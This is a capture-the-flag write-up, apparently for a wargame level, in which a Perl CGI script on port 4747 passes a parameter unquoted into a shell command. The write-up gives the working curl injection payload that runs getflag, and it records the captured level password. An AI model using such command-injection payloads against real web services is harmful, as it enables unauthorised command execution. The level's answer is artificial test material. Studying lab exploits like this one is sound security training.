# level04

## Goal
Trigger `getflag` as `flag04` through the web service in `~`.

## Recon
```sh
$ ls -l ~
-rwsr-sr-x 1 flag04 level04 152 Mar  5  2016 level04.pl
$ cat ~/level04.pl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```

The script is a Perl CGI (served by a web server running as `flag04`, listening on
port **4747**). It takes the GET parameter `x` and drops it, **unquoted**, into a
backtick shell command: `` `echo $y 2>&1` ``. That is a textbook command injection.

```sh
$ netstat -ntlp
tcp6  :::4747  LISTEN
```

## Exploit
Any shell metacharacter in `x` runs as flag04. Use command substitution so the token
comes back in the HTTP response. Backticks are URL-encoded as `%60`:

```sh
$ curl -s "http://localhost:4747/?x=%60getflag%60"
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
```

(`?x=$(getflag)` works too - just make sure the local shell does not expand it before
curl sends it.)

## Result
- **level05 password (token):** `ne2searoevaevoem4ov4ar8ap`
